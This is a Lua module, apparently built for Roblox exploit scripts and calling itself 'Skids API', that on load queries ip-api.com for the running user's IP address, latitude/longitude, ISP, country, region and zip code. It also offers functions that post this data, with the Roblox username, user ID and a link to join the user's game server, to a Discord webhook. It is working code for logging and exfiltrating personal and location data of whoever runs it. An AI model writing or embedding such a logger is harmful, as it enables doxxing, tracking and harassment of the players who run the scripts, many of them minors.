do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname()) or (ZEUS_LOADED and 'Zeus') or (WRD_LOADED and 'WRD')

        exploitName = exploitName or 'I don\'t fucking know'

        return exploitName

    end

    local function format(num, digits)
        return string.format("%0" .. digits .. "i", num)
    end
    
    local function parseDateTime()
        local osDate = os.date("!*t")
        local year, mon, day = osDate["year"], osDate["month"], osDate["day"]
        local hour, min, sec = osDate["hour"], osDate["min"], osDate["sec"]
        return year .. "-" .. format(mon, 2) .. "-" .. format(day, 2) .. "T" .. format(hour, 2) .. ":" .. format(min, 2) .. ":" .. format(sec, 2) .. "Z"
    end

    local skidApi = {
        webhookJson = function(self, scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
       
       
            scriptName = scriptName or 'Viva Mexico'
       
       
            return {
                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                ["embeds"] = {
                        {
                        ["title"] = "Lazarus Api",
                        ["description"] = "By Lazarus",
                        ['thumbnail'] = {
                            ['url']=string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&UserId=%d&format=png',player.UserId)
                        },
                        ["url"] = "https://www.roblox.com/users/1684020941/profile",
                        ["color"] = 526344,
                        ["fields"] = {
                            {
                            ["name"] = "User Data",
                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                            },
                            {
                            ["name"] = "More Info",
                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region: %s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                            }
                        },
                        ["author"] = {
                            ["name"] = "By Lazarus",
                            ["url"] = "https://www.roblox.com/users/1684020941/profile",
                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                        },
                        ["footer"] = {
                            ["text"] = "Skids Hub/ramirez",
                            ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                        },
                        ["timestamp"] = parseDateTime()
                        }
                }
            }
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            print('rekt')
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end
                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end,
        sendWebhookGame = function(self,webhooklink, scriptName)

            if not self then return end

            scriptName = scriptName or 'Viva Mexico!'
            local player = game.Players.LocalPlayer
            local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)

            local webhookJson = {

            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
            ["embeds"] = {
                {
                ["title"] = "Skids API",
                ["description"] = "__a library made for skids :wink:__",
                ["url"] = "https://discord.gg/EUaH265S",
                ["color"] = 526344,
                ["fields"] = {
                    {
                    ["name"] = "User Data",
                    ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                    }
                },
                ["author"] = {
                    ["name"] = "Skids Hub/ramirez",
                    ["url"] = "https://discord.gg/EUaH265S",
                    ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                },
                ["footer"] = {
                    ["text"] = "Skids Hub/ramirez",
                    ["icon_url"] = "https://media.discordapp.net/attachments/923562111660093451/927356696580456498/standard_1.gif"
                },
                ["thumbnail"] = {
                    ["url"] = gameThumb
                  },
                  ["timestamp"] = parseDateTime()
                }
            }
            }

            self.httpPost(
                {
                    Url = webhooklink,
                    Method ='POST',
                    Body = game:GetService('HttpService'):JSONEncode(webhookJson),
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    }
                }
            )
        end

    }

    -- skidApi:sendWebhook('', 'Test1')
    -- skidApi:sendWebhookGame('', 'test 1')

    return skidApi
end







